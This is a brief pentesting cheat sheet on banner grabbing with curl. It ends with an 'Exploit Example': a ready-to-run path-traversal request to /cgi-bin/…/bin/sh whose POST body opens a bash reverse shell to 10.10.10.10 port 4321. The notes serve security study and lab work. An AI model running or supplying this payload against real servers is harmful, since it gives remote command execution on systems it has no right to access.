# Banner Grabbing / Web Server Headers

**Basic Banner Grabbing:**
```bash
curl -IL http://{url}
```
- `-I`: Fetches the headers only.
- `-L`: Follows redirects (if any).

**Custom Headers:**
```bash
curl "http://{url}" -H "{header parameters}"
```
- `-H`: Adds a custom header to the request.

**Exploit Example:**
```bash
curl 'http://10.10.10.10/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.10.10.10/4321 0>&1'
```
- `--data`: Sends data in a POST request.
- `bash -i >& /dev/tcp/10.10.10.10/4321 0>&1` : A reverse shell command.